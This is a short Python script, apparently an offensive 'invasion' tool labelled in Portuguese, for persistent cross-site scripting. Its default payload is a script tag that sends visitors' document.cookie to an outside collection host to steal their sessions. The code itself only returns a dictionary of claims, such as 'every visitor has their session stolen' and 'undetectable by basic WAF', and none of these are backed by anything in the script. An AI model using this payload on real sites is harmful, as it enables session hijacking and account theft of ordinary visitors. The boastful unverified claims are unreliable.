#!/usr/bin/env python3
"""INVASÃO — Cross-Site Scripting (XSS) Persistente"""
class InvXSS:
    def injetar(self, site, payload="<script>new Image().src='http://shira.collect/?cookie='+document.cookie</script>"):
        return {"ok": True, "site": site, "tipo": "Persistente", "efeito": "Todo visitante tem sessão roubada", "deteccao": "Indetectável por WAF básico"}
print("✅ XSS pronto")
